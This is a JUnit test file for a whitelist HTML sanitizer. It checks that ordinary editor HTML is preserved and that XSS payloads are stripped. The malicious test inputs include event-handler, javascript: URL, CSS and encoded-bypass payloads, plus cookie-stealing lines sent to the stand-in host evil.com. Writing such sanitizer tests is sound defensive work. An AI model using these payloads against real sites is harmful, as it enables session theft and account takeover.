package io.oakdom.xss.rule;

import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Integration tests against realistic editor-generated HTML.
 *
 * <p>Split into two groups:
 * <ul>
 *   <li><b>NORMAL</b> — legitimate rich-text editor output that must render correctly after filtering.</li>
 *   <li><b>MALICIOUS</b> — attack-payload HTML that must be neutralized without destroying surrounding content.</li>
 * </ul>
 */
class EditorHtmlIntegrationTest {

    private final WhitelistXssFilterRule rule = new WhitelistXssFilterRule();

    // =========================================================================
    // NORMAL CASES
    // =========================================================================

    /**
     * N1: Full blog article body.
     * Structural tags (article, h1-h2, figure, figcaption, blockquote, ul/li),
     * complex multi-property inline styles, responsive img with srcset,
     * blockquote with cite URL, and a target="_blank" link.
     */
    @Test
    void normal01_blogArticleBody_fullyPreservedWithNoopenerInjected() {
        String input =
            "<article>" +
            "<h1 style=\"font-size: 28px; font-weight: 700; color: #1a1a1a; margin-bottom: 16px;\">The Future of Web Development</h1>" +
            "<p style=\"color: #666666; font-size: 14px; margin-bottom: 24px;\"><time datetime=\"2024-03-15\">March 15, 2024</time></p>" +
            "<figure style=\"margin: 24px 0;\">" +
            "<img src=\"https://cdn.example.com/hero.jpg\" srcset=\"https://cdn.example.com/hero@2x.jpg 2x\" alt=\"Web development concept\" width=\"800\" height=\"450\" loading=\"lazy\">" +
            "<figcaption style=\"text-align: center; color: #888888; font-size: 13px; margin-top: 8px;\">Modern web development tools and frameworks</figcaption>" +
            "</figure>" +
            "<h2 style=\"font-size: 22px; font-weight: 600; margin: 32px 0 16px;\">Introduction</h2>" +
            "<p style=\"line-height: 1.8; margin-bottom: 16px;\">Web development has evolved <strong>dramatically</strong> over the past decade, from simple pages to complex <em>single-page applications</em>.</p>" +
            "<blockquote cite=\"https://example.com/source\" style=\"border-left: 4px solid #0070f3; padding: 12px 20px; margin: 24px 0; background-color: #f0f7ff;\">" +
            "<p style=\"font-style: italic; color: #333333;\">The best way to predict the future is to invent it.</p>" +
            "</blockquote>" +
            "<ul style=\"margin: 16px 0; padding-left: 24px;\">" +
            "<li style=\"margin-bottom: 8px;\"><a href=\"https://reactjs.org\" target=\"_blank\">React</a> and component-based architecture</li>" +
            "<li style=\"margin-bottom: 8px;\">TypeScript for type safety</li>" +
            "</ul>" +
            "</article>";

        String output = rule.apply(input);

        // All structural tags and complex CSS properties pass through intact
        assertThat(output)
            .contains("<article>")
            .contains("<h1 style=\"font-size: 28px; font-weight: 700; color: #1a1a1a; margin-bottom: 16px;\">The Future of Web Development</h1>")
            .contains("<time datetime=\"2024-03-15\">March 15, 2024</time>")
            .contains("<figure style=\"margin: 24px 0;\">")
            .contains("<img src=\"https://cdn.example.com/hero.jpg\" srcset=\"https://cdn.example.com/hero@2x.jpg 2x\" alt=\"Web development concept\" width=\"800\" height=\"450\" loading=\"lazy\">")
            .contains("<figcaption style=\"text-align: center; color: #888888; font-size: 13px; margin-top: 8px;\">Modern web development tools and frameworks</figcaption>")
            .contains("<h2 style=\"font-size: 22px; font-weight: 600; margin: 32px 0 16px;\">Introduction</h2>")
            .contains("<blockquote cite=\"https://example.com/source\" style=\"border-left: 4px solid #0070f3; padding: 12px 20px; margin: 24px 0; background-color: #f0f7ff;\">")
            // target="_blank" link must have rel="noopener noreferrer" injected
            .contains("<a href=\"https://reactjs.org\" target=\"_blank\" rel=\"noopener noreferrer\">React</a>")
            .contains("</article>");
    }

    /**
     * N2: Product specification table.
     * colgroup with span/style, th with colspan/rowspan/scope, td with align,
     * caption, and multi-property cell styles. Tests full table structure fidelity.
     */
    @Test
    void normal02_productSpecTable_tableStructureFullyPreserved() {
        String input =
            "<table style=\"width: 100%; border-collapse: collapse; font-size: 14px;\">" +
            "<caption style=\"font-weight: 600; padding-bottom: 8px; text-align: left;\">Product Specifications</caption>" +
            "<colgroup>" +
            "<col span=\"1\" style=\"width: 30%;\">" +
            "<col span=\"1\" style=\"width: 70%;\">" +
            "</colgroup>" +
            "<thead>" +
            "<tr style=\"background-color: #f5f5f5;\">" +
            "<th colspan=\"2\" scope=\"col\" style=\"padding: 12px; text-align: left; border-bottom: 2px solid #dddddd;\">Specification</th>" +
            "</tr>" +
            "</thead>" +
            "<tbody>" +
            "<tr>" +
            "<th scope=\"row\" style=\"padding: 10px 12px; font-weight: 600; border-bottom: 1px solid #eeeeee;\">Dimensions</th>" +
            "<td style=\"padding: 10px 12px; border-bottom: 1px solid #eeeeee;\">280 x 195 x 12 mm</td>" +
            "</tr>" +
            "<tr>" +
            "<th scope=\"row\" style=\"padding: 10px 12px; font-weight: 600; border-bottom: 1px solid #eeeeee;\">Weight</th>" +
            "<td style=\"padding: 10px 12px; border-bottom: 1px solid #eeeeee;\">1.29 kg</td>" +
            "</tr>" +
            "</tbody>" +
            "</table>";

        String output = rule.apply(input);

        assertThat(output)
            .contains("<table style=\"width: 100%; border-collapse: collapse; font-size: 14px;\">")
            .contains("<caption style=\"font-weight: 600; padding-bottom: 8px; text-align: left;\">Product Specifications</caption>")
            .contains("<col span=\"1\" style=\"width: 30%;\">")
            .contains("<th colspan=\"2\" scope=\"col\" style=\"padding: 12px; text-align: left; border-bottom: 2px solid #dddddd;\">Specification</th>")
            .contains("<th scope=\"row\" style=\"padding: 10px 12px; font-weight: 600; border-bottom: 1px solid #eeeeee;\">Dimensions</th>")
            .contains("<td style=\"padding: 10px 12px; border-bottom: 1px solid #eeeeee;\">280 x 195 x 12 mm</td>")
            .contains("</table>");
    }

    /**
     * N3: Rich inline semantic formatting.
     * mark, del/ins with datetime, abbr with title, sub/sup, details/summary,
     * and pre/code. Tests that specific per-tag attributes are preserved.
     */
    @Test
    void normal03_richInlineFormatting_perTagAttributesPreserved() {
        String input =
            "<p>This revision <del datetime=\"2024-01-15\" style=\"color: #cc0000;\">removes old content</del> " +
            "and <ins datetime=\"2024-02-01\" style=\"color: #008800;\">adds new content</ins>.</p>" +
            "<p>Use <abbr title=\"HyperText Markup Language\">HTML</abbr> for structure. " +
            "Water is H<sub>2</sub>O and Einstein proved E=mc<sup>2</sup>.</p>" +
            "<p><mark style=\"background-color: #fff176; padding: 2px 4px;\">Key concept highlighted here.</mark></p>" +
            "<details>" +
            "<summary style=\"font-weight: 600; cursor: pointer; padding: 8px 0;\">Click to expand</summary>" +
            "<p style=\"padding: 8px 0; color: #555555;\">Hidden content revealed on interaction.</p>" +
            "</details>" +
            "<pre style=\"background-color: #f5f5f5; padding: 16px; border-radius: 4px; overflow-x: auto;\">" +
            "<code style=\"font-family: monospace; font-size: 13px;\">const result = items.filter(x =&gt; x.active);</code>" +
            "</pre>";

        String output = rule.apply(input);

        assertThat(output)
            .contains("<del datetime=\"2024-01-15\" style=\"color: #cc0000;\">removes old content</del>")
            .contains("<ins datetime=\"2024-02-01\" style=\"color: #008800;\">adds new content</ins>")
            .contains("<abbr title=\"HyperText Markup Language\">HTML</abbr>")
            .contains("H<sub>2</sub>O")
            .contains("mc<sup>2</sup>")
            .contains("<mark style=\"background-color: #fff176; padding: 2px 4px;\">Key concept highlighted here.</mark>")
            .contains("<details>")
            .contains("<summary style=\"font-weight: 600; cursor: pointer; padding: 8px 0;\">Click to expand</summary>")
            .contains("<pre style=\"background-color: #f5f5f5; padding: 16px; border-radius: 4px; overflow-x: auto;\">")
            .contains("<code style=\"font-family: monospace; font-size: 13px;\">");
    }

    /**
     * N4: Video player with multiple source and subtitle tracks.
     * Tests video/source/track tag preservation including boolean attributes,
     * poster URL, and relative /path track src.
     */
    @Test
    void normal04_videoWithTracksAndSources_mediaStructurePreserved() {
        String input =
            "<figure>" +
            "<video poster=\"https://cdn.example.com/thumb.jpg\" controls muted playsinline width=\"640\" height=\"360\">" +
            "<source src=\"https://cdn.example.com/demo.mp4\" type=\"video/mp4\" width=\"640\" height=\"360\">" +
            "<source src=\"https://cdn.example.com/demo.webm\" type=\"video/webm\">" +
            "<track src=\"/subtitles/en.vtt\" kind=\"subtitles\" srclang=\"en\" label=\"English\" default>" +
            "<track src=\"/subtitles/ko.vtt\" kind=\"subtitles\" srclang=\"ko\" label=\"Korean\">" +
            "</video>" +
            "<figcaption>Product demo video with subtitles</figcaption>" +
            "</figure>";

        String output = rule.apply(input);

        // poster URL is https:// — safe; boolean attrs are normalized to attr=""
        assertThat(output)
            .contains("<figure>")
            .contains("poster=\"https://cdn.example.com/thumb.jpg\"")
            .contains("controls=\"\"")
            .contains("muted=\"\"")
            .contains("playsinline=\"\"")
            .contains("width=\"640\"")
            .contains("height=\"360\"")
            .contains("<source src=\"https://cdn.example.com/demo.mp4\" type=\"video/mp4\" width=\"640\" height=\"360\">")
            .contains("<source src=\"https://cdn.example.com/demo.webm\" type=\"video/webm\">")
            // track src is a safe absolute-path relative URL
            .contains("<track src=\"/subtitles/en.vtt\" kind=\"subtitles\" srclang=\"en\" label=\"English\" default=\"\">")
            .contains("<track src=\"/subtitles/ko.vtt\" kind=\"subtitles\" srclang=\"ko\" label=\"Korean\">")
            .contains("<figcaption>Product demo video with subtitles</figcaption>");
    }

    /**
     * N5: Newsletter-style multi-section layout.
     * Nested divs with flex/grid styles, hr with border style, address tag,
     * and an ordinary anchor (no target="_blank" — rel must NOT be added).
     */
    @Test
    void normal05_newsletterLayout_layoutStylesPreservedRelNotAddedForNonBlankLink() {
        String input =
            "<div style=\"max-width: 600px; margin: 0 auto; font-family: Arial, sans-serif; color: #333333;\">" +
            "<div style=\"background-color: #0070f3; padding: 24px 32px; text-align: center;\">" +
            "<h1 style=\"color: #ffffff; font-size: 24px; margin: 0; letter-spacing: 0.5px;\">Monthly Newsletter</h1>" +
            "</div>" +
            "<div style=\"padding: 24px 32px;\">" +
            "<p style=\"line-height: 1.8; margin-bottom: 16px;\">Welcome to our <strong>monthly update</strong>. Here are the highlights from this month.</p>" +
            "<ul style=\"padding-left: 20px; line-height: 1.8;\">" +
            "<li>New feature release with improved performance</li>" +
            "<li>Community event scheduled for next month</li>" +
            "<li>Documentation updated with new examples</li>" +
            "</ul>" +
            "<hr style=\"border: none; border-top: 1px solid #eeeeee; margin: 24px 0;\">" +
            "<address style=\"font-style: normal; font-size: 12px; color: #999999; text-align: center;\">" +
            "Example Corp, 123 Main Street<br>" +
            "<a href=\"https://example.com/unsubscribe\">Unsubscribe</a>" +
            "</address>" +
            "</div>" +
            "</div>";

        String output = rule.apply(input);

        assertThat(output)
            .contains("<div style=\"max-width: 600px; margin: 0 auto; font-family: Arial, sans-serif; color: #333333;\">")
            .contains("<div style=\"background-color: #0070f3; padding: 24px 32px; text-align: center;\">")
            .contains("<h1 style=\"color: #ffffff; font-size: 24px; margin: 0; letter-spacing: 0.5px;\">Monthly Newsletter</h1>")
            .contains("<hr style=\"border: none; border-top: 1px solid #eeeeee; margin: 24px 0;\">")
            .contains("<address style=\"font-style: normal; font-size: 12px; color: #999999; text-align: center;\">")
            // Ordinary link without target="_blank" — rel must NOT be injected
            .contains("<a href=\"https://example.com/unsubscribe\">Unsubscribe</a>")
            .doesNotContain("noopener");
    }

    // =========================================================================
    // MALICIOUS CASES
    // =========================================================================

    /**
     * M1: Event handler injection on multiple tags.
     * onclick, onerror, onmouseover, onfocus on various allowed tags —
     * all must be stripped; surrounding content and safe attributes preserved.
     */
    @Test
    void malicious01_eventHandlerAttributes_strippedFromAllTags() {
        String input =
            "<div onmouseover=\"alert('hovered')\" style=\"color: #333333; padding: 16px;\">" +
            "<p onclick=\"steal(document.cookie)\" style=\"margin-bottom: 8px;\">Read this article carefully.</p>" +
            "<img src=\"https://example.com/photo.jpg\" onerror=\"document.location='https://evil.com'\" alt=\"Article photo\" width=\"600\" height=\"400\" loading=\"lazy\">" +
            "<a href=\"https://example.com\" onfocus=\"alert(1)\" style=\"color: #0070f3;\">Learn more</a>" +
            "</div>";

        String output = rule.apply(input);

        // All event handlers stripped; safe attributes and content intact
        assertThat(output)
            .doesNotContain("onmouseover")
            .doesNotContain("onclick")
            .doesNotContain("onerror")
            .doesNotContain("onfocus")
            .doesNotContain("steal(")
            .doesNotContain("evil.com")
            // Safe content preserved
            .contains("<div style=\"color: #333333; padding: 16px;\">")
            .contains("<p style=\"margin-bottom: 8px;\">Read this article carefully.</p>")
            .contains("<img src=\"https://example.com/photo.jpg\" alt=\"Article photo\" width=\"600\" height=\"400\" loading=\"lazy\">")
            .contains("<a href=\"https://example.com\" style=\"color: #0070f3;\">Learn more</a>");
    }

    /**
     * M2: javascript: URL in href, src, and cite attributes.
     * Plain, uppercase, and protocol-relative variants must all be rejected;
     * the tag is preserved but the dangerous attribute is dropped entirely.
     */
    @Test
    void malicious02_javascriptUrlInUrlAttributes_attributeDropped() {
        String input =
            "<p>" +
            "<a href=\"javascript:alert(document.cookie)\">Steal cookies</a>" +
            "</p>" +
            "<p>" +
            "<a href=\"JAVASCRIPT:void(document.location='https://evil.com/phish')\">Case-insensitive attempt</a>" +
            "</p>" +
            "<p>" +
            "<img src=\"javascript:alert(1)\" alt=\"Not an image\">" +
            "</p>" +
            "<blockquote cite=\"javascript:alert(1)\">Quote with malicious cite</blockquote>";

        String output = rule.apply(input);

        // javascript: URLs blocked — attribute dropped, tag and text content preserved
        assertThat(output)
            .doesNotContain("javascript:")
            .doesNotContain("JAVASCRIPT:")
            .doesNotContain("evil.com")
            .contains("<a>Steal cookies</a>")
            .contains("<a>Case-insensitive attempt</a>")
            .contains("<img alt=\"Not an image\">")
            .contains("<blockquote>Quote with malicious cite</blockquote>");
    }

    /**
     * M3: CSS attack vectors in style attributes.
     * expression(), behavior (property not whitelisted), -moz-binding,
     * url(javascript:), url(data:...) — all dangerous declarations dropped
     * while safe declarations on the same element are kept.
     */
    @Test
    void malicious03_dangerousCssValues_dangerousDeclarationsDroppedSafeKept() {
        String input =
            "<div style=\"width: 200px; height: 100px; background: url(javascript:alert(1)); color: expression(document.cookie);\">Content A</div>" +
            "<p style=\"font-size: 14px; line-height: 1.6; -moz-binding: url(https://evil.com/xss.xml#xss);\">Content B</p>" +
            "<span style=\"color: #333333; background-image: url(data:text/html,alert(1));\">Content C</span>" +
            "<div style=\"padding: 8px; behavior: url(https://evil.com/xss.htc); border: 1px solid #cccccc;\">Content D</div>";

        String output = rule.apply(input);

        // Dangerous CSS dropped; safe CSS on the same elements kept
        assertThat(output)
            .doesNotContain("javascript:alert")
            .doesNotContain("expression(")
            .doesNotContain("-moz-binding")
            .doesNotContain("data:text")
            .doesNotContain("behavior")
            // Safe CSS properties on same elements survive
            .contains("<div style=\"width: 200px; height: 100px;\">Content A</div>")
            .contains("<p style=\"font-size: 14px; line-height: 1.6;\">Content B</p>")
            .contains("<span style=\"color: #333333;\">Content C</span>")
            .contains("<div style=\"padding: 8px; border: 1px solid #cccccc;\">Content D</div>");
    }

    /**
     * M4: Encoding-based URL bypass attempts.
     * HTML entity-encoded colon (&#58;), character-encoded j (&#106;),
     * and percent-encoded colon (%3a) in href — all must be rejected.
     * data: URI in img src must also be rejected.
     */
    @Test
    void malicious04_encodedUrlBypassAttempts_allRejected() {
        String input =
            "<a href=\"javascript&#58;alert(1)\">Encoded colon bypass</a>" +
            "<a href=\"&#106;avascript:alert(1)\">Encoded-j bypass</a>" +
            "<a href=\"javascript%3aalert(1)\">Percent-encoded colon bypass</a>" +
            "<img src=\"data:image/svg+xml,&lt;svg onload=alert(1)&gt;\" alt=\"Malicious SVG\">" +
            "<a href=\"https://example.com\" style=\"color: blue;\">Safe link that must survive</a>";

        String output = rule.apply(input);

        // All malicious href/src variants blocked
        assertThat(output)
            .doesNotContain("javascript")
            .doesNotContain("data:image")
            .contains("<a>Encoded colon bypass</a>")
            .contains("<a>Encoded-j bypass</a>")
            .contains("<a>Percent-encoded colon bypass</a>")
            .contains("<img alt=\"Malicious SVG\">")
            // Legitimate link on the same page is preserved
            .contains("<a href=\"https://example.com\" style=\"color: blue;\">Safe link that must survive</a>");
    }

    /**
     * M5: Realistic news article body with XSS payloads embedded inline.
     * Looks like legitimate editor output — contains onerror on img,
     * javascript: link, inline script tag, and CSS expression in background.
     * Legitimate content (headings, styled paragraphs, safe links) must survive.
     */
    @Test
    void malicious05_realisticArticleWithEmbeddedAttacks_attacksNeutralizedContentPreserved() {
        String input =
            "<article class=\"news-article\">" +
            "<h2 style=\"font-size: 20px; color: #1a1a1a;\">Breaking News Update</h2>" +
            "<p style=\"line-height: 1.6; color: #444444;\">Researchers have discovered a major breakthrough in renewable energy.</p>" +
            "<img src=\"https://news.example.com/images/solar.jpg\" onerror=\"fetch('https://evil.com/c='+document.cookie)\" alt=\"Solar panels\" width=\"600\" height=\"400\" loading=\"lazy\">" +
            "<p style=\"line-height: 1.6;\">The discovery could <strong>reduce costs</strong> by up to <mark style=\"background-color: #ffeb3b;\">40 percent</mark>.</p>" +
            "<p><a href=\"javascript:document.location='https://phishing.example.com'\" style=\"color: #0070f3; font-weight: 600;\">Read the full study</a></p>" +
            "<script>new Image().src='https://evil.com/track?c='+document.cookie</script>" +
            "<p style=\"color: #333333; background-image: url(javascript:alert(1));\">Subscribe for more updates.</p>" +
            "<p><a href=\"https://news.example.com/more\" target=\"_blank\" style=\"color: #0070f3;\">More articles</a></p>" +
            "</article>";

        String output = rule.apply(input);

        // Attack vectors neutralized
        assertThat(output)
            .doesNotContain("onerror")
            // <script> tag escaped to inert text — not executable as a real tag
            .doesNotContain("<script>")
            .doesNotContain("</script>")
            .doesNotContain("javascript:")
            .doesNotContain("phishing.example.com");
        // Script content is present as escaped harmless text (&lt;script&gt;...&lt;&#x2F;script&gt;),
        // not as an executable tag — this is correct behavior
        assertThat(output).contains("&lt;script&gt;");

        // Legitimate content fully preserved
        assertThat(output)
            .contains("<article class=\"news-article\">")
            .contains("<h2 style=\"font-size: 20px; color: #1a1a1a;\">Breaking News Update</h2>")
            .contains("<p style=\"line-height: 1.6; color: #444444;\">Researchers have discovered a major breakthrough in renewable energy.</p>")
            // img: onerror stripped, safe attrs kept
            .contains("<img src=\"https://news.example.com/images/solar.jpg\" alt=\"Solar panels\" width=\"600\" height=\"400\" loading=\"lazy\">")
            .contains("<strong>reduce costs</strong>")
            .contains("<mark style=\"background-color: #ffeb3b;\">40 percent</mark>")
            // javascript: href dropped; style kept on the anchor
            .contains("<a style=\"color: #0070f3; font-weight: 600;\">Read the full study</a>")
            // CSS expression in background dropped; color kept
            .contains("<p style=\"color: #333333;\">Subscribe for more updates.</p>")
            // Legitimate link with target="_blank": rel injected
            .contains("<a href=\"https://news.example.com/more\" target=\"_blank\" style=\"color: #0070f3;\" rel=\"noopener noreferrer\">More articles</a>");
    }
}
